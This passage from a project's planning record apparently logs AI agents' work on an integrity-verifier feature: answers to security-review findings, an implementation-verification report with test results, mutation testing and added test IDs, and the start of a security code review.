| NU-PR6 three Dispositions items missing | accepted | *Dispositions*: a Q1(a) `wontfix` line with the revival rule's homes; the NU1 precedent in the CHANGELOG bullet and in *Acceptance criteria* > C7's log-row criterion; the stale citations as a `defer` for the archive batch (also *Scope* > "Found while planning"). |
| NU-PR7 K5 and the noise signal | accepted, as recommended | K5 now quotes old text beside new and notes `git log -p` keeps it. *Dispositions* splits the noise signal: the filled-slot half is guarded by C9's listing tests, the reflex-marker half is a one-line board watch on the Q2 row. No tracker class (new shipped-module scope no one accepted). |
| NU-PR8 C9 and D4 disagree | accepted | D4 states its reasoning; *Acceptance criteria* > C9, "The warning and the pointer, both cases", has a test for each; *Scope delta* now says five things differ and names D4. |
| NU-PR9 C11 placement and order | accepted | *Acceptance criteria* > C11: the merged paragraph covers the third category and the discipline only, and the "no tool ships" and revival sentences sit beside "The claim half is not shipped here"; *Sequence* runs C11 right after C1. |
| NU-SR1 (blocking) living-state files never fed hostile input | accepted | *Acceptance criteria* > C8: six living-state inputs in the verdict test (FIFO under a timeout, symlinked leaf, symlinked parent, directory, over the cap, not UTF-8), each shown to reach the note; "One reader, for every file the note opens" with the grep; the mutant "read a living-state file with `Path.read_bytes()`" in *Verification*; the containment named in D7 and the reader bullet (the component-by-component walk, with the loop's `resolve()` already keeping escaping paths out); *Verification* > S5 gains the living-race line. |
| NU-SR2 two unbounded inputs; flaky timing | accepted | *Acceptance criteria* > C9: "Substitution is bounded" (length computed before building, 24th input) and "Linear end to end" (pairing by the one pass's name map, a closed-slot test, an absolute bound, best of three, no single ratio); D5 gains the new "unreadable" reason; two mutants in *Verification*. |
| NU-SR3 C2's protected-code check fails by construction | accepted | *Acceptance criteria* > C2, "The interpreter-binding code, by name": the ten functions, full dump for eight, docstring-stripped dump plus hunks-inside-the-docstring for the two that hold a hit; the script and its controls are in *Verification*. |
| NU-SR4 the verdict test cannot see a loop edit; flush; broken stderr | accepted | *Acceptance criteria* > C8: "Edits only add" (the loop gains lines only, the two `return` statements stay, the failed count is derived after the loop), "Order and flush" (the flush and a merged-stream subprocess test), and the one-shot old-versus-new comparison, repeated at C9 and C12. *In brief* now says "the result `verify()` returns"; C10 names the exit-120 edge; S4 says it too. |
| NU-SR5 frozen test has no add-only rule; ceremony facts | accepted | *Acceptance criteria* > C8 and C9: the test file's diff adds lines and removes none, and every base node is still collected. *Scope* > "Frozen files and the AST baseline" gains the phase-mutable files and what evidence stands behind the roster authorization; the board row in `dev/PLANNING.md` gets the same two sentences. |
| NU-SR6 "zero" and marked lines outside `templates/` | accepted | *In brief*, *Acceptance criteria* > C7 (the limits row), *Dispositions* (the CHANGELOG bullet) and S5 all say it: marked lines outside `templates/` are exempt by design, those files do not ship, and `info=` is the only sign. |

**Also taken from the Security Review's body, not numbered findings.** One sentence in C9 says why `ascii()` and not `encode_display` (`ascii()` escapes a superset, is a builtin and not a second table, and importing the session kernel would add the non-engine import `test_scaffold_substrate.py` keeps out). The reviewer's "simpler design" (compare against the checkout's template, as the fork advisory does) is **noted and not adopted**: it trades the untrusted base-copy reader for a version-skew gap whenever the checkout and the install differ, and it departs from the accepted text (Revision 3, item 2), so adopting it would be a deviation for the Maintainer. *Dispositions* records it as a considered alternative, `wontfix`, so the next change to the note can weigh it.

**Calls I made while folding.** Each is a detail two readings would settle differently. None adds an outcome.

* **How the loop stays add-only.** The accepted records are collected in an `else:` branch after the hash comparison, the living-state records just before their `continue`, and the note is called just before each existing `return`, so `return 1` and `return 0` stand untouched. The failed count is derived after the loop. This is the reviewer's "two added lines" fix made exact.
* **Living-state containment.** The note's reader takes the same component walk as for base copies; the loop's `resolve()` containment has already kept an escaping path from reaching it. Either was safe, so I named the one that gives a single reader.
* **Where the substitution case lives.** C8 has 23 hostile inputs and C9 adds the 24th, because the substitution code arrives in C9.
* **The pointer test moves to C9.** C10 runs first, so the heading exists when the test is born.
* **Absolute bounds, measured.** The linear-time bound is chosen at the implementation: about 20 times the linear implementation's measured time and under the per-name search's time on the same text, both figures recorded.

**Questions for the Maintainer.** None. Every fix stays within the accepted text, and *Dispositions* puts the one `defer` batch (Q2 and its watch, and the stale citations) to the Maintainer at archive-preparation, as the template asks.

**Scope.** Nothing accepted is dropped and *Scope delta* stands at `preserved`; it now names five differences in mechanism instead of four. There is no second plan-review round. Status `revising-plan` -> `ready-to-implement`.

## Implementation verification -- Claude Sonnet 5.5 -- 2026-10-18

**Status**: ready-to-implement -> implementing -> awaiting-code-review. The first edge is `d0647d5f`; this commit is the second.

**Boundary B mode**: `full`. The plan's four reasons stand and none was argued down: fourteen frozen files change and the pinned collection grows; vendor-neutrality, the lockfile reader, the interpreter binding and the content scanner are trust-ceremony surfaces; ten executable templates ship byte for byte; the accepted text says so.

**Tested commit**: `7d528f4d58e2e98c8d4206cd5674c32e310b4da2`

**Reviewed range**: `bb4f710a..7d528f4d`, non-contiguous (other sessions' commits interleave). This plan's commits, in run order:

| Commit | Chunk |
| --- | --- |
| `d0647d5f` | Status -> implementing |
| `1fb06ea6` | C1 -- the stricter checker |
| `0c9b568c` | C11 -- #16's paragraph |
| `01d21423` | C2-C4 -- skills, onboarding package, scanner and intent tool (one commit, as the plan allows) |
| `346eda64` | C5 -- shipped Markdown |
| `0000c15b` | C6 -- Cairn's own prose (the gate first reads `fail=0` here, `info=42`) |
| `a1e2bc9d` | C7 -- zero, and the log |
| `ca7179a6` | C8 -- the note's frame |
| `67aac1d4` | C10 -- the upgrade guide |
| `63336156` | C9 -- the listing |
| `7d528f4d` | C9 follow-up -- one shape table for the opener and closer samples (a defect found while preparing this run: the closer list was `str.replace` of the opener list, so an upper-case closer was never tried) |
| `d820d856` | C12 cold read -- the guide's slot-note bullet (prose only, after the tested commit) |

**Interpreter/runtime**: `/Users/kendal30/conda_envs/lhm/bin/python3.13` -- Python 3.13.13 (conda-forge, Clang 19.1.7), pytest 9.0.3, pluggy 1.6.0, macOS. `PYTHONDONTWRITEBYTECODE=1` exported for the suite (the same host dependency the `suite-run-diagnostics` record names).

**Pre-run state**: a fresh `git worktree add --detach` of `7d528f4d` under the session scratchpad; `git status --short` prints nothing. **Post-run state**: the same worktree, `git status --short` prints nothing.

### Starts that are not evidence

Two starts preceded the recorded one. The first (at `63336156`) lacked `PYTHONDONTWRITEBYTECODE=1` and I stopped it at about 5%. The second (same commit, variable set) stopped at about 4% for a reason I did not establish; another session on the same machine was running the same command line at the time. The recorded run is the third start, and it began after the follow-up commit above, so it covers the test bytes that commit carries.

### Command table

| Command | Exit | Outcomes | Elapsed |
| --- | --- | --- | --- |
| `CAIRN_FULL_SUITE=1 python -m pytest bootstrap/tests --quality-gate-shuffle-seed=0` (run through `python -c "import sys, pytest; sys.exit(pytest.main([...same arguments..., '-p', 'no:cacheprovider', '-q']))"`, which differs from `python -m pytest` only in its process name, after the second start above stopped) | 1 | **3504 passed, 2 failed**, 3 warnings; no skip, xfail or xpass | 841.26 s (0:14:01) |
| `python scripts/quality_gate.py --sub neutrality --sub redundancy` | 0 | neutrality `fail=0 info=56`; redundancy `fail=0 info=0` | 2 s |
| `python scripts/check_cairn.py` | 0 | OK, 182 Markdown files, no issues | 3 s |
| `python scripts/claim_check.py <file>` over the 21 documents this plan edits (the plan file is checked in the commit that carries this record) | 0 each | no claim-check flags in any of the 21 | -- |
| `python scripts/link_check.py bootstrap/UPGRADE.md` | 0 | OK | -- |

`info=56` is 21 (before) + 21 (C6's marked mentions and block) + 14 (token occurrences in C7's six log rows, which sit inside the log's marker block).

### Non-pass disposition

**Two failures, both the AST attestation, both not this plan's.** `test_ast_attest.py::test_committed_baseline_accounted_for_across_the_engine_package` and `::test_ast_gate_passes_over_the_full_scaffold_module_set` report four changed engine symbols. The plan expected two such nodes, and they are the ones that fail. No other test failed, skipped, xfailed or xpassed. `test_security_stack.py::test_a_t4_output_is_bounded`, the load flake, passed.

The CHANGED set, derived by `python bootstrap/tests/_ast_attest.py verify --known-new <known_new> <baseline> bootstrap/_scaffold/*.py` on a `git archive` extraction of each commit:

| Commit | CHANGED symbols |
| --- | --- |
| `bb4f710a` (this plan's base) | `_cmd_adopt_module`, `main`, `seed_gitignore` (3) |
| `3ba6f230` (another session's `.gitignore` repair; the only commit in the range that touches `bootstrap/_scaffold/`) | the same three and `cmd_upgrade` (4) |
| `63336156` (the tested commit's parent) | the same four |
| `7d528f4d` (tested) | the same four |

**The base and tested sets are not equal, and the difference is not this plan's:** it is `cmd_upgrade`, which arrived with `3ba6f230`. None of this plan's commits changes a byte under `bootstrap/_scaffold/` or `bootstrap/scaffold.py` (`git show --name-only` over each prints no such path), and `git diff --stat 3ba6f230 7d528f4d -- bootstrap/_scaffold bootstrap/scaffold.py` is empty, so the set is identical from that commit to the tested one. `git diff --stat bb4f710a..7d528f4d -- bootstrap/_scaffold bootstrap/scaffold.py` is not empty for the same reason: it lists `upgrade.py` (+14) and `SECURITY_MUTATIONS.md`, both `3ba6f230`'s. The AST re-anchor stays the Maintainer's.

### Plan-specific acceptance, at the tested commit

* **Neutrality.** `fail=0 info=56`, exit 0. The plants, each alone on a copy of the tested commit's bytes (the unplanted copy reads 0 first):

  | Plant | `fail=` |
  | --- | --- |
  | visible prose in a `templates/` `.md` | 1 |
  | a whole-line HTML comment in `templates/` | 1 |
  | a `.txt` file in `templates/` | 1 |
  | a `.json` value in `templates/` | 1 |
  | `Copilot` (an added name) in `templates/` prose | 1 |
  | blind spots: lower-case `claude`; `ClaudeCode`; `GPT4o`; `Claude_Code`; a zero-width character inside `Claude` | 0 each |

* **The two probes** (the proposal's smoke checks), with `W4` a detached checkout of `4ad1c115`, `WB` one of the tested commit, `T` a scratch target:

  ```
  python W4/bootstrap/scaffold.py --config W4/bootstrap/profiles/solo-greenfield.yml --target T --cairn-root W4 --allow-dev
  # fill slot bodies in T (every slot; or only project-overview and project-conventions in AGENTS.md and team-roster in dev/collaboration_agreement.md)
  python W4/bootstrap/scaffold.py upgrade --target T --finalize <the filled paths>
  python WB/bootstrap/scaffold.py upgrade --target T --plan
  python WB/bootstrap/scaffold.py upgrade --target T --stage
  python WB/bootstrap/scaffold.py upgrade --target T --apply
  python WB/bootstrap/verify_integrity.py --target T
  ```

  *Fully filled* (22 slots in 9 files; the proposal said 23): the note checks 23 slots and lists **exactly one**, `'dev/proposals/_template.md' slot 'assurance-path-triggers'`. *Partly filled* (the three Maintainer-input slots): it lists **17**, `assurance-path-triggers` among them and not singled out. That is the proposal's measured 17 and the accepted Q2 limit, not a defect. Two facts about the harness: one prose conflict in the staged `dev/plans/_template.md` was resolved by keeping both sides; and both probe trees exit 1 for a reason that is not the note's -- the `4ad1c115` install marked its fold-back ledger under `dev/.cairn/` living-state, a path the verifier no longer authorizes, so it reports `illegal living_state opt-out`. The plan-open verifier (`bb4f710a`) reports the same single violation on the same tree.
* **`python bootstrap/verify_integrity.py --target .`** at the tested commit exits 1 and lists the plan's 18 files, no more and no fewer. Its coverage line: `files in scope 35; checked 1; slots checked 0, listed 0 ...; not checked: no base copy 17, failed the integrity check 16, base hash mismatch 1, unreadable 0`, equal to an independent count over the lockfile (35 non-verbatim records, 2 base copies, 1 matching its `base_hash`, 16 failing).
* **Old versus new, on the tested commit.** The parent's `verify_integrity.py` (the file at `bb4f710a`, unchanged until C8) beside the new one under another name, same engine: 24 hostile cases, a fresh `solo-greenfield` install (exit 0), that install with a modified `AGENTS.md` (exit 1) and Cairn's own tree (exit 1) -- **27 trees, exit code, stdout and stderr (minus `slot note:` lines) equal for every one**. Blobs: `verify_integrity.py` `4376f4bd`, `test_verify_integrity.py` `607ab83c`. (C8's commit body says its swap test was added after the comparison it quotes; the blob it quotes, `dace9edf`, is the commit's own, so that comparison ran on the committed bytes. The body is wrong on that one point.)
* **The kernel comparison** (C2). The interpreter-binding script reads **SAME** for `templates/skills/_lib/session.py` and `tools/session.py` against `b13ad7b7` (the ten named functions; the two docstring hits are the only hunks in `cmd_session_start` and `cmd_session_end`), the pair is `cmp`-identical, and `01d21423` is the only commit in the range that touches either.
* **The one-time name search**, repeated over every added line of `git diff -U0 b13ad7b7..7d528f4d` (same exclusions as C7, same 20 names, case-insensitive substring, control: a scratch `ClaudeCode` line is found): 52 hits, 36 distinct words, read by hand. Beyond C7's list the new words come from other sessions' commits in the range: `dev/reviews/` records (a deliberation record like the excluded `dev/plans/` and `dev/proposals/`; the words are the reviewers' name, `.claude/...` paths, a `/conda_envs/lhm/` interpreter path and a proposal path). Everything else is a routing id or path (`.claude/skills`; the plan stem `2026-05-28-claude-cairn-progressive-onboarding`), a word that merely contains "meta" (`metadata`, `stage_meta`), or a name on a line that now carries a `vendor-ok` marker or sits inside the roster-example block. No joined, lower-case or odd spelling of a name outside a path.
* **The mutation ledger, on the tested bytes** (a separate copy of the tested commit, control 122 passed before each mutant): **36 mutants, 36 killed, none survived.** C8's 18: note before the report (passing run, failing run); note inside the record loop; `Exception` only (`SystemExit` through); fence removed; `O_NOFOLLOW` dropped; the `fstat` regular-file check dropped; read without the cap; base-directory containment dropped; `base_hash` comparison skipped; non-mapping tokens accepted; non-string token keys and values accepted; per-record handler removed; a verbatim record read; a living-state file read with `Path.read_bytes` (killed by the FIFO case at its 20 s timeout); flush dropped; component-by-component symlink walk dropped; UTF-8 checks dropped. C9's 18: a customized slot listed (the one earlier survivor; killed once a test isolated the marker's own effect); token substitution dropped; `str()` for `ascii()`; a `--finalize` line printed; substitution-length bound dropped; slots paired by a per-name search; warning repeated per entry; warning on a quiet run; warning missing when only a file failed; a blank base slot listed; spacing not normalized; the living line asking for a recording step; the customized marker offered as the way to fill; a pointer to a heading that does not exist; a line claiming an obligation; base slots counted when unpaired; a verbatim record read; a nested opener not abandoning the slot before it.
* **Linear time, measured.** A cap-sized file of 4,352 closed slots on both sides: 11 ms for the note's pass; the engine-style per-name lookup on the installed side alone, 690 ms; the test's bound is 0.25 s (best of three). Cap-sized unclosed openers: 3 ms, bound 0.1 s.
* **Not touched.** None of this plan's commits changes `bootstrap/tests/_gate_manifest.py`, `bootstrap/tests/fixtures/gate_manifest.json`, `bootstrap/tests/fixtures/scaffold_ast_baseline.json`, `AGENTS.md`, `templates/core/AGENTS.md` or `scripts/check_model_selection.py`; the only `doctrine/` files they change are `lifecycle-contract.md` and `rationale.md` (markers, no line added) and `consolidation-review.md` (six log rows, nothing outside its marker block). The `_scaffold` paths are covered above.
* **The guide, read cold against the finished note.** I followed `bootstrap/UPGRADE.md` step 4 and the section *Recording an edit you made* from the file alone, against the note as built. Everything checks except two statements in the "slot note" bullet: it said the coverage line is what the note "always ends with", but the warning and the pointer follow it whenever a slot is listed or a file failed; and it did not say the advisory is skipped when the lockfile is missing, unparseable or records no files (the two fail-closed returns). **Fixed in `d820d856`**, a prose-only commit after the tested commit (the bullet now says "always includes" and names the two fail-closed returns). It changes no code, test, template or fixture byte, so this record stands; claim_check, link_check and check_cairn are clean on the file after it, and the section's eleven required phrases still occur in it.

### Changes for the Maintainer's re-anchor (`bootstrap/REANCHOR_RUNBOOK.md`)

* **Frozen files changed: 14**, read from `bootstrap/tests/fixtures/gate_manifest.json` > `frozen_files` (183 keys) against every file this plan's commits change (control: `bootstrap/verify_integrity.py` is frozen, `README.md` is not): `scripts/quality_gate.py`, `scripts/content_scan.py`, `scripts/onboarding_activate.py`, `bootstrap/verify_integrity.py`, `bootstrap/tests/fixtures/skills/README.md`, `bootstrap/tests/test_quality_gate_neutrality.py`, `bootstrap/tests/test_verify_integrity.py`, `templates/modules/team-gated/content_scan.py`, and `templates/modules/default-on/_onboarding/{__init__,activation,cli,security,shared,triggers}.py`.
* **Phase-mutable files changed: 2** (a `PHASE-CHANGED` note, never a hold): `templates/modules/team-gated/intent.py`, `templates/modules/default-on/onboarding_activate.py`.
* **Node-set changes:** `test_quality_gate_neutrality.py` 22 -> 30 collected (+8); `test_verify_integrity.py` 19 -> 122 collected (+103; 13 pinned). All 41 base nodes of the two files are still collected. The 111 added IDs, as `pytest --collect-only -q` prints them at the tested commit:

```
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanComments::test_vendor_name_in_a_whole_line_html_comment_fails
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanComments::test_whole_line_directive_that_names_a_vendor_fails_twice
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanFileTypes::test_vendor_name_in_a_txt_file_fails
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanFileTypes::test_vendor_name_in_a_json_file_fails
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanNames::test_added_tool_names_fail_in_a_template[Copilot]
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanNames::test_added_tool_names_fail_in_a_template[Windsurf]
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanNames::test_added_tool_names_fail_in_a_template[Cline]
bootstrap/tests/test_quality_gate_neutrality.py::TestTemplatesScanNames::test_added_tool_names_fail_in_a_template[OpenCode]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-not-a-string]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-a-directory]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-a-fifo]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-a-symlink]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-symlinked-parent]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-outside-the-target]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-outside-base-dir]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_cache-nul-byte]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base-copy-over-the-cap]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base-copy-not-utf8]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_hash-does-not-match]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[base_hash-not-a-string]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[tokens-not-a-mapping]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[tokens-non-string-key]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[tokens-non-string-value]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[installed-not-utf8]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[installed-over-the-cap]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[living-a-fifo]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[living-a-symlink]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[living-symlinked-parent]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[living-a-directory]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[living-over-the-cap]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[living-not-utf8]
bootstrap/tests/test_verify_integrity.py::test_no_lockfile_or_file_shape_changes_the_verdict[token-value-times-twenty-over-the-cap]
bootstrap/tests/test_verify_integrity.py::test_the_note_runs_after_the_report_on_a_passing_run
bootstrap/tests/test_verify_integrity.py::test_the_note_runs_after_the_report_on_a_failing_run
bootstrap/tests/test_verify_integrity.py::test_a_fail_closed_early_return_never_calls_the_note
bootstrap/tests/test_verify_integrity.py::test_the_report_comes_before_the_note_in_a_merged_stream
bootstrap/tests/test_verify_integrity.py::test_the_note_is_handed_nothing_that_could_change_the_verdict
bootstrap/tests/test_verify_integrity.py::test_an_exception_in_the_note_becomes_one_line_naming_only_its_type
bootstrap/tests/test_verify_integrity.py::test_a_system_exit_in_the_note_is_fenced_and_the_code_is_kept
bootstrap/tests/test_verify_integrity.py::test_a_keyboard_interrupt_in_the_note_is_not_swallowed
bootstrap/tests/test_verify_integrity.py::test_a_record_with_an_unsafe_base_copy_still_fails_on_its_own
bootstrap/tests/test_verify_integrity.py::test_open_flags_are_built_when_the_note_runs_not_when_the_module_loads
bootstrap/tests/test_verify_integrity.py::test_one_reader_opens_every_file_the_note_reads
bootstrap/tests/test_verify_integrity.py::test_a_file_of_exactly_the_cap_is_read_and_one_byte_more_is_not
bootstrap/tests/test_verify_integrity.py::test_every_file_in_scope_lands_in_exactly_one_bucket
bootstrap/tests/test_verify_integrity.py::test_the_coverage_line_is_printed_when_nothing_can_be_checked
bootstrap/tests/test_verify_integrity.py::test_a_verbatim_record_is_neither_opened_nor_counted
bootstrap/tests/test_verify_integrity.py::test_a_living_state_file_is_read_and_counted_like_any_other
bootstrap/tests/test_verify_integrity.py::test_a_living_state_flag_outside_the_authorised_set_is_counted_as_failed_and_not_read
bootstrap/tests/test_verify_integrity.py::test_a_file_swapped_for_a_symlink_after_the_path_walk_is_refused
bootstrap/tests/test_verify_integrity.py::test_an_unfilled_slot_is_listed
bootstrap/tests/test_verify_integrity.py::test_a_filled_slot_is_never_listed
bootstrap/tests/test_verify_integrity.py::test_a_slot_marked_customized_is_not_listed[<!-- cairn:customized -->]
bootstrap/tests/test_verify_integrity.py::test_a_slot_marked_customized_is_not_listed[<!--cairn:customized-->]
bootstrap/tests/test_verify_integrity.py::test_a_slot_marked_customized_is_not_listed[<!--  CAIRN:CUSTOMIZED  -->]
bootstrap/tests/test_verify_integrity.py::test_the_customized_marker_alone_keeps_a_slot_off_the_list[<!-- cairn:customized -->]
bootstrap/tests/test_verify_integrity.py::test_the_customized_marker_alone_keeps_a_slot_off_the_list[<!--CAIRN:customized-->]
bootstrap/tests/test_verify_integrity.py::test_a_slot_blank_in_its_base_copy_is_counted_and_gets_no_advice
bootstrap/tests/test_verify_integrity.py::test_recorded_tokens_are_substituted_and_unknown_ones_left_intact
bootstrap/tests/test_verify_integrity.py::test_spacing_alone_does_not_make_a_slot_look_filled
bootstrap/tests/test_verify_integrity.py::test_a_slot_only_the_base_has_is_not_listed
bootstrap/tests/test_verify_integrity.py::test_unclosed_and_unpaired_markers_list_nothing[<!-- cairn:slot a -->\nPlaceholder.\n]
bootstrap/tests/test_verify_integrity.py::test_unclosed_and_unpaired_markers_list_nothing[Placeholder.\n<!-- cairn:end a -->\n]
bootstrap/tests/test_verify_integrity.py::test_unclosed_and_unpaired_markers_list_nothing[<!-- cairn:slot a -->\nPlaceholder.\n<!-- cairn:end b -->\n]
bootstrap/tests/test_verify_integrity.py::test_unclosed_and_unpaired_markers_list_nothing[<!-- cairn:slot a -->\n<!-- cairn:slot b -->\nPlaceholder.\n<!-- cairn:end a -->\n]
bootstrap/tests/test_verify_integrity.py::test_an_oversized_substitution_is_refused_before_it_is_built
bootstrap/tests/test_verify_integrity.py::test_unclosed_openers_in_a_cap_sized_file_cost_linear_time
bootstrap/tests/test_verify_integrity.py::test_closed_slots_on_both_sides_cost_linear_time
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slot x -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!--cairn:slot x-->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!--  cairn:slot   x  -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- CAIRN:SLOT x -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slot\tx -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slot x-->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slot -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slot x y -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slot x -- >]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_openers_as_the_engine_does[<!-- cairn:slotx -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:end x -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!--cairn:end x-->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!--  cairn:end   x  -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- CAIRN:END x -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:end\tx -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:end x-->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:end -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:end x y -->]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:end x -- >]
bootstrap/tests/test_verify_integrity.py::test_the_note_reads_slot_closers_as_the_engine_does[<!-- cairn:endx -->]
bootstrap/tests/test_verify_integrity.py::test_a_name_longer_than_the_bound_is_the_one_marker_the_note_skips
bootstrap/tests/test_verify_integrity.py::test_the_customized_marker_and_token_patterns_are_the_engines
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[plain]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[a\nb]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[  a\n\n  b  \n]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[a\r\nb\r\n]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[a\r\n\r\n b]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[\ta\u2028b\x0bc\x0cd\x85e]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[\n\n\n]
bootstrap/tests/test_verify_integrity.py::test_spacing_blankness_and_tokens_follow_the_engine[a \n \n b]
bootstrap/tests/test_verify_integrity.py::test_the_note_finds_the_slot_bodies_the_engine_finds
bootstrap/tests/test_verify_integrity.py::test_nothing_the_note_prints_is_outside_printable_ascii
bootstrap/tests/test_verify_integrity.py::test_no_line_of_the_note_prints_a_command
bootstrap/tests/test_verify_integrity.py::test_the_warning_and_pointer_print_once_when_a_slot_is_listed
bootstrap/tests/test_verify_integrity.py::test_the_warning_and_pointer_print_once_when_a_file_failed_and_nothing_is_listed
bootstrap/tests/test_verify_integrity.py::test_a_run_with_nothing_to_act_on_prints_only_the_coverage_line
bootstrap/tests/test_verify_integrity.py::test_the_lines_say_what_a_placeholder_is_and_claim_no_obligation
bootstrap/tests/test_verify_integrity.py::test_the_pointer_names_a_heading_that_exists
bootstrap/tests/test_verify_integrity.py::test_the_hint_and_the_guide_no_longer_offer_history_as_enough
bootstrap/tests/test_verify_integrity.py::test_a_placeholder_slot_can_be_listed_filled_recorded_and_stop_being_listed
bootstrap/tests/test_verify_integrity.py::test_a_first_install_with_a_planted_line_gets_no_command_from_the_note
bootstrap/tests/test_verify_integrity.py::test_a_placeholder_reworded_by_an_upgrade_reads_as_filled
```

### Known omissions

* macOS only: Windows and Linux were not run. The reader's flags degrade to 0 where an `os.O_*` name is missing (tested by deleting them), but `O_NONBLOCK` on a FIFO was exercised only here.
* The probes resolved one prose conflict by keeping both sides; an adopter's hand resolution may differ. They show the note's listing, not an adopter's whole upgrade.
* Three more future-tense "Goal 1" lines remain in `docs/DOCUMENTATION_PLAN.md` (`:178`, `:207`, `:365`); the plan named six lines and C6 corrected those six.
* The note has no cap on the number of lines it prints; a base copy with thousands of unfilled slots prints thousands of lines. A changed lockfile and base copy can already steer the note (S5), and the output grants nothing.
* The suite was run once, at one shuffle seed (`--quality-gate-shuffle-seed=0`), as the plan specifies.

## Code review -- Claude Opus 5.5 (Security Review) -- 2026-10-18

```
Reviewed commit: afbb1f232bc2e7fa8a639590632aba15ce58ce89
Target: the security-relevant chunks at that commit, read against the plan's parent bb4f710a: C8 and C9 (ca7179a6, 63336156, 7d528f4d; bootstrap/verify_integrity.py and bootstrap/tests/test_verify_integrity.py), C2's rewording of tools/session.py and templates/skills/_lib/session.py (in 01d21423), and C1's checker (1fb06ea6)
Prior findings: NU-SR1 to NU-SR6 (e4eafbc8) and the Response that folded them; the proposal's SR2-SR5, SR9, SR12, SR15 and SR16 where they touch C8-C9
Assurance path: high-assurance
```

**Obligation**: Internal Security Review
**Tier**: Internal Security Review
**Findings**: raised (6; none blocking)

**Model**: claude-opus-5-5

Distance: a fresh session. I wrote none of the code, the plan, the proposal or any of their reviews, and I am not the implementer (the record above is signed Claude Sonnet 5.5). This pass is the Security Review of the code only; the ordinary code review is a separate session's.

### In plain terms

